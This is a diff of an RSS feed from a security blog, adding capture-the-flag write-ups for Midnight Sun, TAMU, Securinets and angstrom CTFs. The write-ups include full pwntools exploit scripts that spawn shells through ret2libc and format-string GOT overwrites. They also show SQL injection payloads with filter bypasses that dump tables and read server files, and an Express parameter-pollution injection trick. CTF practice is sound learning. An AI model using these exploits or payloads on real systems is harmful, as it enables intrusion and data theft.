@@ -2,21 +2,275 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts | Kahla</title>
-    <link>/post/</link>
-      <atom:link href="/post/index.xml" rel="self" type="application/rss+xml" />
+    <link>https://ahmed-belkahla.me/post/</link>
+      <atom:link href="https://ahmed-belkahla.me/post/index.xml" rel="self" type="application/rss+xml" />
     <description>Posts</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2020</copyright><lastBuildDate>Sat, 21 Mar 2020 00:00:00 +0000</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2020</copyright><lastBuildDate>Sat, 04 Apr 2020 00:00:00 +0000</lastBuildDate>
     <image>
-      <url>/img/me.jpg</url>
+      <url>https://ahmed-belkahla.me/img/me.jpg</url>
       <title>Posts</title>
-      <link>/post/</link>
+      <link>https://ahmed-belkahla.me/post/</link>
     </image>
     
     <item>
+      <title>Midnight Sun CTF Quals 2020 - Pwn Writeups</title>
+      <link>https://ahmed-belkahla.me/post/midnight-sun-ctfquals/</link>
+      <pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/midnight-sun-ctfquals/</guid>
+      <description>&lt;h1 id=&#34;pwn170pts-&#34;&gt;&lt;strong&gt;pwn1(70pts)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/4fbyzFx.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D
+here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
+from pwn import *
+p=remote(&amp;quot;pwn1-01.play.midnightsunctf.se&amp;quot;,10001)
+#p=process(&amp;quot;./pwn1&amp;quot;)
+OFFSET=cyclic(72)
+POP_RDI_RET=p64(0x0000000000400783)
+PUTS=p64(0x0000000000400550)
+LEAK=p64(0x602020)
+MAIN=p64(0x400698)
+payload=OFFSET+POP_RDI_RET+LEAK+PUTS+MAIN
+log.info(&amp;quot;Payload Crafted&amp;quot;)
+p.recvuntil(&amp;quot;buffer:&amp;quot;)
+log.info(&amp;quot;Sending payload&amp;quot;)
+#raw_input(&amp;quot;attach&amp;quot;)
+p.sendline(payload) 
+data=p.recvline().strip()
+leak=u64(data.ljust(8,&amp;quot;\x00&amp;quot;))
+BASE_LIBC=leak-0x64e80       # local 0x54a20 
+log.info(&amp;quot;leaked libc base: &amp;quot;+hex(BASE_LIBC))
+p.recvuntil(&amp;quot;buffer:&amp;quot;)
+#BINSH=p64(BASELIBC+0x183cee)
+#SYSTEM=p64(BASELIBC+0x46ed0)
+RET=p64(0x0000000000400536)  
+SYSTEM=p64(BASE_LIBC+0x4f440)
+BINSH=p64(BASE_LIBC+0x1b3e9a)
+payload=OFFSET+RET+POP_RDI_RET+BINSH+SYSTEM
+p.sendline(payload)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;** NOTE: ** Check Task files ** 
+&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; **&lt;/p&gt;
+&lt;h1 id=&#34;pwn280pts-&#34;&gt;&lt;strong&gt;pwn2(80pts)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/lYjuGsS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D
+Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
+from pwn import *
+def extract(add,n):
+        p1=&amp;quot;0x&amp;quot;+add[-4:]
+        p2=add[:6]
+        if n==1:
+                return p1
+        if n==2:
+                return p2
+def pad(payload):
+        return payload+&amp;quot;X&amp;quot;*(63-len(payload))
+#p=process(&amp;quot;./pwn2&amp;quot;)
+p=remote(&amp;quot;pwn2-01.play.midnightsunctf.se&amp;quot;,10002)
+p.recvuntil(&amp;quot;input:&amp;quot;)
+EXITGOT=p32(0x804b020)
+EXITGOT2=p32(0x804b020+2)
+&#39;&#39;&#39;
+s=&amp;quot;&amp;quot;
+for i in range(27,34):
+        s+=&amp;quot;%&amp;quot;+str(i)+&amp;quot;$p &amp;quot;
+&#39;&#39;&#39;
+payload=EXITGOT+EXITGOT2
+payload+=&amp;quot;%2044x%8$hn%32231x%7$hn&amp;quot;
+#raw_input(&amp;quot;attach&amp;quot;)
+p.sendline(pad(payload))
+p.recvuntil(&amp;quot;input:&amp;quot;)
+p.sendline(pad(&amp;quot;%30$x&amp;quot;))
+data=p.recvuntil(&amp;quot;X&amp;quot;)
+printf=int(&amp;quot;0x&amp;quot;+data[-9:-1],16)-5
+LIBCBASE=printf-0x50b60
+log.info(&amp;quot;Leaked Libc Base : &amp;quot;+hex(LIBCBASE))
+p.recvuntil(&amp;quot;input:&amp;quot;)
+PRINTFGOT=p32(0x804b00c)
+PRINTFGOT2=p32(0x804b00c+2)
+SYSTEM=LIBCBASE+0x3cd10
+log.info(&amp;quot;System address: &amp;quot;+hex(SYSTEM))
+payload=PRINTFGOT
+payload+=PRINTFGOT2
+p1=int(extract(hex(SYSTEM),1),16)
+p2=int(extract(hex(SYSTEM),2),16)
+log.info(&amp;quot;P1: &amp;quot;+str(p1-8)+&amp;quot; P2: &amp;quot;+str(p2-p1))
+payload+=&amp;quot;%&amp;quot;+str(p1-8)+&amp;quot;x%7$hn%&amp;quot;+str(p2-p1)+&amp;quot;x%8$hn&amp;quot;
+log.info(&amp;quot;Payload crafted&amp;quot;)
+p.sendline(pad(payload))
+p.recvuntil(&amp;quot;input:&amp;quot;)
+p.sendline(&amp;quot;/bin/sh&amp;quot;)
+p.interactive()
+
+#Main address 0x80485eb
+# 7 stack adress
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;** NOTE: ** Task files ** 
+&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; **&lt;/p&gt;
+&lt;p&gt;These tasks were really fun, i&amp;rsquo;m sorry for the lack of details because i&amp;rsquo;m really busy this period :(&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>TAMU CTF 2020 - Pwn Writeups</title>
+      <link>https://ahmed-belkahla.me/post/tamuctfpwn/</link>
+      <pubDate>Mon, 30 Mar 2020 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/tamuctfpwn/</guid>
+      <description>&lt;h2 id=&#34;b64decoder-244pts-&#34;&gt;&lt;strong&gt;B64DECODER (244pts)&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/ZVHG4PA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/EIv7uYX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The idea is to overwrite the GOT entry of a64l function with the address of system in libc (not system@plt) using the format string vulnerability , it&amp;rsquo;s also a partial overwrite because we have a limited length of input (32 characters) and using the leaked address of a64l we can easily know the address of system function , here is my exploit :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
+import struct
+import sys
+def pad(str):
+        return str+&amp;quot;X&amp;quot;*(32-len(str))
+payload=&amp;quot;&amp;quot;
+#p=process(&amp;quot;./b64decoder&amp;quot;)
+p=remote(&amp;quot;challenges.tamuctf.com&amp;quot;,2783)
+d=p.recvuntil(&amp;quot;name!&amp;quot;)
+A64Ladd=d[:-18][-10:]
+TOWRITE=&amp;quot;0x&amp;quot;+A64Ladd[-4:]
+sys=int(TOWRITE,16)-1680-4  #A64l-0x690
+log.info(TOWRITE)
+log.info(sys)
+A64L_PLT=0x804b398
+a64lADD=p32(A64L_PLT)
+payload+=a64lADD
+payload+=&amp;quot;%&amp;quot;+str(sys)+&amp;quot;x%71$hn&amp;quot;
+log.info(&amp;quot;payload crafted&amp;quot;)
+p.sendline(payload)
+log.info(&amp;quot;Sent , Haaaw el shell&amp;quot;)
+p.interactive()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And Bingo we got our shell :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/jd78uIm.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;** NOTE: ** Task files ** 
+&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/B64DECODER&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; **&lt;/p&gt;
+&lt;h2 id=&#34;troll-50pts-&#34;&gt;&lt;strong&gt;TROLL (50pts)&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/AgJ7rGR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed
+value to the time and finally the beginning of the loop and generating the random numbers and questions each time .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/AApFQgK.png&#34; alt=&#34;MAIN&#34;&gt;&lt;/p&gt;
+&lt;p&gt;My idea was to overwrite the seed value with our own value than BINGO we can generate the next random numbers and win the game , i have done things manually , i entered a unique seaquence and than observed with gdb if i have overwritten where the seed value is stored&lt;/p&gt;
+&lt;p&gt;My input :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/XqjEzZQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I have entered a sequence of alphabet characters and stopped in the call of srand function , you can see te RDI register(where the 1st argument passed to a function is stored)  hold the value of &amp;ldquo;MMMM&amp;rdquo;
+so if we replace &amp;ldquo;MMMM&amp;rdquo; with the value we want , this value will be the seed for the random numbers.&lt;/p&gt;
+&lt;p&gt;I have written this little C program to generate 100 random numbers using our chosen seed and stored them in a file :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdlib.h&amp;gt;
+#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;time.h&amp;gt;
+
+int main(int argc, char *argv[]){
+    int i=0;
+int seed=3472328296227680305    //0x1000 in decimal
+srand(seed);
+for(i=0;i&amp;lt;=99;i++){
+    int a=rand()% 100000 + 1;
+    printf(&amp;quot;%d\n&amp;quot;,a);  
+} 
+ return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After that i have written this exploit to overwrite the seed value with 0x1000 and answer the questions using the numbers we have generated&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
+#p=process(&amp;quot;./troll&amp;quot;)
+p=remote(&amp;quot;challenges.tamuctf.com&amp;quot;,4765)
+p.recvuntil(&amp;quot;Who goes there?&amp;quot;)
+SEED=&amp;quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000&amp;quot;
+p.sendline(SEED)
+log.info(&amp;quot;Sent First payload&amp;quot;)
+answers=open(&amp;quot;answer&amp;quot;,&amp;quot;r&amp;quot;)
+for line in answers:
+        p.recvuntil(&amp;quot;What is it?&amp;quot;)
+        log.info(&amp;quot;sending answer: &amp;quot;+line)
+        p.sendline(line)
+p.interactive()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Note: the offset in the remote server is different, so i had to guess it xD However we got our flag :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/QjwTHDR.png&#34; alt=&#34;MAIN&#34;&gt;&lt;/p&gt;
+&lt;p&gt;** NOTE: ** Task files ** 
+&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/TROLL&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; **&lt;/p&gt;
+&lt;p&gt;This is the first time writing a pwn writeup so i hope you enjoyed it , any questions you can find me on twitter @BelkahlaAhmed1&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>The After Prequal - Securinets Quals 2k20</title>
+      <link>https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/</link>
+      <pubDate>Mon, 23 Mar 2020 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/</guid>
+      <description>&lt;h1 id=&#34;the-after-prequal-971pts-19-solves-&#34;&gt;&lt;strong&gt;The after-Prequal (971pts) (19 Solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/pXLjH4n.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let&amp;rsquo;s start the exploitation of the famous SQL injection :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/B2IbSxr.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After the basic enumeration we can notice that these characters are filtered : &lt;strong&gt;[&amp;rdquo; &amp;ldquo;,&amp;quot;-&amp;quot;,&amp;quot;,&amp;quot;]&lt;/strong&gt; so we will use the following bypasses:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The white space : &lt;strong&gt;%0A&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;The &amp;ldquo;-&amp;rdquo; : we will use &lt;strong&gt;#&lt;/strong&gt; to comment&lt;/li&gt;
+&lt;li&gt;The &amp;ldquo;,&amp;rdquo; : we will use join to bypass it&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;This step took me some time , after some tries i succeeded in equilibrating the query :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/5VSI80e.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Tables:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Table name&lt;/strong&gt;: secrets&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/m190lNI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Columns:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=&amp;quot;secrets&amp;rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The interesting &lt;strong&gt;Column name&lt;/strong&gt; : value&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/TegJtmS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And finally :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/8ycD4ru.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Damn no flag for us :&#39;( but no problem maybe if we just do load_file(&amp;ldquo;flag.txt&amp;rdquo;) we will have the flag ? unfortunately it wont work, in fact it&amp;rsquo;s not that easy and this is the most juicy part of the task xd
+i checked the privileges of the current user and the FILE permission was not grantable ! wtf , this result was unpredictable for me so i started digging in mysql file permissions docs until i found this :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/TgUXftd.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;To limit the location in which files can be read and written, set the &lt;strong&gt;secure_file_priv&lt;/strong&gt; system variable to a specific directory. See Section 5.1.8, “Server System Variables”.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;So probably the author have set a custom location in the global variable &lt;strong&gt;secure_file_priv&lt;/strong&gt; , let&amp;rsquo;s check its value in @@GLOBAL.secure_file_priv&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/Pdn180B.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;BINGOOO ! so let&amp;rsquo;s have our flag now :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(&amp;quot;/var/lib/mysql-files/flag/flag.txt&amp;rdquo;))b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;FLAG&lt;/strong&gt; : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don&amp;rsquo;t hesitate to ask me on twitter @BelkahlaAhmed1 :D&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>Empire Total - Securinets Quals 20</title>
-      <link>/post/empire-total-securinetsquals20/</link>
+      <link>https://ahmed-belkahla.me/post/empire-total-securinetsquals20/</link>
       <pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate>
-      <guid>/post/empire-total-securinetsquals20/</guid>
+      <guid>https://ahmed-belkahla.me/post/empire-total-securinetsquals20/</guid>
       <description>&lt;h1 id=&#34;empire-total-1000pts-7-solves-&#34;&gt;&lt;strong&gt;Empire Total (1000pts) (7 Solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/rGcoI7o.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This task was really so creative and i had so fun solving it , but i can&amp;rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let&amp;rsquo;s download it and begin our trip xD&lt;/p&gt;
@@ -140,6 +394,258 @@ we will find that the url we scanned in VirusTotal website will appear , it&amp;
 &lt;p&gt;Yees We did it , &lt;strong&gt;FLAG&lt;/strong&gt; : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}&lt;/p&gt;
 &lt;p&gt;I have really liked the idea of the challenge, it&amp;rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.&lt;/p&gt;
 &lt;p&gt;I hope you liked the writeup if you have any questions don&amp;rsquo;t hesitate to contact me &lt;strong&gt;Twitter&lt;/strong&gt; : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>ångstrom CTF 2k20 - Web Exploitation</title>
+      <link>https://ahmed-belkahla.me/post/angstromctf20/</link>
+      <pubDate>Thu, 19 Mar 2020 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/angstromctf20/</guid>
+      <description>&lt;h1 id=&#34;a-peculiar-query-180pts-73-solves-&#34;&gt;&lt;strong&gt;A Peculiar Query (180pts) (73 Solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/A6EHPkW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I really liked this web task , we are given this web page that have a search functionality&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/gRutDcV.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And we can read the source code&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;
+const express = require(&amp;quot;express&amp;quot;);
+const rateLimit = require(&amp;quot;express-rate-limit&amp;quot;);
+const app = express();
+const { Pool, Client } = require(&amp;quot;pg&amp;quot;);
+const port = process.env.PORT || 9090;
+const path = require(&amp;quot;path&amp;quot;);
+
+const client = new Client({
+	user: process.env.DBUSER,
+	host: process.env.DBHOST,
+	database: process.env.DBNAME,
+	password: process.env.DBPASS,
+	port: process.env.DBPORT
+});
+
+async function query(q) {
+	const ret = await client.query(`SELECT name FROM Criminals WHERE name ILIKE &#39;${q}%&#39;;`);
+	return ret;
+}
+
+app.set(&amp;quot;view engine&amp;quot;, &amp;quot;ejs&amp;quot;);
+
+app.use(express.static(&amp;quot;public&amp;quot;));
+
+app.get(&amp;quot;/src&amp;quot;, (req, res) =&amp;gt; {
+	res.sendFile(path.join(__dirname, &amp;quot;index.js&amp;quot;));
+});
+
+app.get(&amp;quot;/&amp;quot;, async (req, res) =&amp;gt; {
+	if (req.query.q) {
+		try {
+			let q = req.query.q;
+			// no more table dropping for you
+			let censored = false;
+			for (let i = 0; i &amp;lt; q.length; i ++) {
+				if (censored || &amp;quot;&#39;-\&amp;quot;.&amp;quot;.split``.some(v =&amp;gt; v == q[i])) {
+					censored = true;
+					q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
+				}
+			}
+			q = q.substring(0, 80);
+			const result = await query(q);
+			res.render(&amp;quot;home&amp;quot;, {results: result.rows, err: &amp;quot;&amp;quot;});
+		} catch (err) {
+			console.log(err);
+			res.status(500);
+			res.render(&amp;quot;home&amp;quot;, {results: [], err: &amp;quot;aight wtf stop breaking things&amp;quot;});
+		}
+	} else {
+		res.render(&amp;quot;home&amp;quot;, {results: [], err: &amp;quot;&amp;quot;});
+	}
+});
+
+app.listen(port, function() {
+	client.connect();
+	console.log(&amp;quot;App listening on port &amp;quot; + port);
+});
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;overview-&#34;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s pretty obvious that we have an sql injection here ( we are concatenating the user input )&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;const ret = await client.query(&lt;code&gt;SELECT name FROM Criminals WHERE name ILIKE &#39;${q}%&#39;;&lt;/code&gt;);&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;But as we can see some filters are here :&#39;( these characters are filtered : [&#39;,-,&amp;quot;,.] , after some tries i have figured that it will be impossible to bypass
+them so i started looking to some JS tricks.
+As we can see the filter function is looping over our input and checks if there are some prohibited characters and then it will replace
+them with &amp;ldquo;*&amp;rdquo; , For example if we type&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;hello&amp;quot;or 1=1 &amp;ndash; -&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Our input will be changed to :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;hello************&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let q = req.query.q;
+let censored = false;
+for (let i = 0; i &amp;lt; q.length; i ++) {
+	if (censored || &amp;quot;&#39;-\&amp;quot;.&amp;quot;.split``.some(v =&amp;gt; v == q[i])) {
+			censored = true;
+			q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
+			}
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And finally it&amp;rsquo;s using substring function to limit our input&amp;rsquo;s length to 80 characters&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;q = q.substring(0, 80);
+const result = await query(q);
+res.render(&amp;quot;home&amp;quot;, {results: result.rows, err: &amp;quot;&amp;quot;});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Hmmm everything seems okay nah ? but it&amp;rsquo;s a ctf web task we have to find some vulnerabilities ! let&amp;rsquo;s pass to how i did to solve it now, enough boring things&lt;/p&gt;
+&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;The first thing i thinked about was http parameter pollution in express (read about it &lt;strong&gt;
+&lt;a href=&#34;https://github.com/expressjs/express/issues/1824&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; if you want ) ,briefly when we enter a get parameter multiple times express
+has a weird interpretation , it will process this parameter as an array for example here, if we pass this in the query :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?q=hello&amp;amp;q=allo&amp;amp;q=fword&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;req.query.q&lt;/strong&gt; will be parsed as an array &lt;strong&gt;[&amp;ldquo;hello&amp;rdquo;,&amp;ldquo;allo&amp;rdquo;,&amp;ldquo;fword&amp;rdquo;]&lt;/strong&gt; , so if we go further when we will be iterating of &lt;strong&gt;q&lt;/strong&gt; variable we will be comparing each array field with the filters
+for example, if we pass this query :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;q=&amp;quot;or 1=1 &amp;ndash; -&amp;amp;q=fword&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;we will firstly compare &lt;strong&gt;&amp;ldquo;or 1=1 &amp;ndash; -&lt;/strong&gt; and then the second field &lt;strong&gt;fword&lt;/strong&gt; with these filtered chars &lt;strong&gt;[&#39;,-,&amp;quot;,.]&lt;/strong&gt; , they are not equal ! , Youupi we can get our flag now as we passed the check .&lt;/p&gt;
+&lt;p&gt;Unfortunately , it&amp;rsquo;s not that easy ,have you forgot the substring function ? an array has not a built in substring function so when we reach the substring part this will raise an error so we won&amp;rsquo;t execute the sql query :/
+Javascript weird behaviour will save us this time ! if we do &lt;strong&gt;[]+[]&lt;/strong&gt; the result is a string , the sum of two arrays is a string so if we enter a &lt;strong&gt;&amp;quot;&lt;/strong&gt; in one query parameter
+we will enter this part&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;censored = true;
+q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and arrays have a built in slice function so the result of &lt;strong&gt;[]+&amp;rdquo;*&amp;ldquo;+[]&lt;/strong&gt; will be a string , we can now enter our payload with &lt;strong&gt;q=&amp;rsquo;&lt;/strong&gt; in the end to ensure that our array will be a string when it reaches the substring part
+For example :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;q=&#39;or 1=1 &amp;ndash; -&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=&amp;rsquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;will let us pass !&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FILTERS BYPASSED SUCCESSFULLY&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;To test the number of q parameters and debug the app , i changed a little bit the source code and hosted the web app locally , you can find the modified source code &lt;strong&gt;
